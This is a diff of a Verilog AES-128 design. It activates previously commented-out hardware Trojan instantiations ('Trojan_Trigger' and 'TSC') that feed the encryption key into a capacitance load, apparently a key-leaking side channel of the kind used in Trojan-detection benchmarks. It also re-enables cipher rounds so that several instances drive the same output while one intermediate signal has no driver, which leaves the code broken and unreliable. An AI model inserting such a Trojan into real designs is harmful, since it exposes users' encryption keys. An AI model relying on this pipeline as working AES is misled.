@@ -35,8 +35,8 @@ module top(clk, rst, state, key, out, Capacitance);
 	aes_128 AES (.clk(clk),.state(state),.key(key),.out(out));
 	wire Tj_Trig;
 	
-	//Trojan_Trigger Tj_Trigger(.rst (rst), .state (state), .Tj_Trig(Tj_Trig));
-    //TSC tro (.rst (rst),.clk (clk),.key (key), .Tj_Trig(Tj_Trig) ,.load(Capacitance));
+	Trojan_Trigger Tj_Trigger(.rst (rst), .state (state), .Tj_Trig(Tj_Trig));
+    TSC tro (.rst (rst),.clk (clk),.key (key), .Tj_Trig(Tj_Trig) ,.load(Capacitance));
 
 endmodule
 
@@ -87,7 +87,7 @@ module aes_128(clk, state, key, out);
 	//assign out=k0b;
 	
     expand_key_128 a2  (.clk(clk), .in(k1),  .out_1(k2),  .out_2(k1b), .rcon(8'h00));
-	/*
+	
     expand_key_128 a3  (.clk(clk), .in(k2),  .out_1(k3),  .out_2(k2b), .rcon(8'h04));
 	
     expand_key_128 a4  (.clk(clk), .in(k3),  .out_1(k4),  .out_2(k3b), .rcon(8'h08));
@@ -97,7 +97,7 @@ module aes_128(clk, state, key, out);
     expand_key_128 a8  (.clk(clk), .in(k7),  .out_1(k8),  .out_2(k7b), .rcon(8'h80));
     expand_key_128 a9  (.clk(clk), .in(k8),  .out_1(k9),  .out_2(k8b), .rcon(8'h1B));
     expand_key_128 a10 (.clk(clk), .in(k9),  .out_1(k10_unused), .out_2(k9b), .rcon(8'h36));
-	*/
+	
 	//expand_key_128 a10 (.clk(clk), .in(k2),  .out_1(k10_unused), .out_2(k9b), .rcon(8'h00));
 
   // -------------------------------------------------------
@@ -106,10 +106,9 @@ module aes_128(clk, state, key, out);
 	//assign out = s0;
 	
     one_round  r1 (.clk(clk), .state_in(s0), .key(k0), .state_out(s1));
-	//assign out = s1;
-	//assign k1b = k10_unused & k10_unused;
-    //one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(out));
-	/*
+	
+    one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(out));
+	
     one_round  r3 (.clk(clk), .state_in(s2), .key(k2b), .state_out(s3));
 	
     one_round  r4 (.clk(clk), .state_in(s3), .key(k3b), .state_out(s4));
@@ -117,14 +116,10 @@ module aes_128(clk, state, key, out);
     one_round  r6 (.clk(clk), .state_in(s5), .key(k5b), .state_out(s6));
     one_round  r7 (.clk(clk), .state_in(s6), .key(k6b), .state_out(s7));
     one_round  r8 (.clk(clk), .state_in(s7), .key(k7b), .state_out(out));
-	//assign out = k7b;
     one_round  r9 (.clk(clk), .state_in(s8), .key(k8b), .state_out(out));
 	
-
-    //final_round rf (.clk(clk), .state_in(s2), .key_in(k9b), .state_out(out));
 	final_round rf (.clk(clk), .state_in(s9), .key_in(k9b), .state_out(out));
 
-	*/
 
 endmodule
 
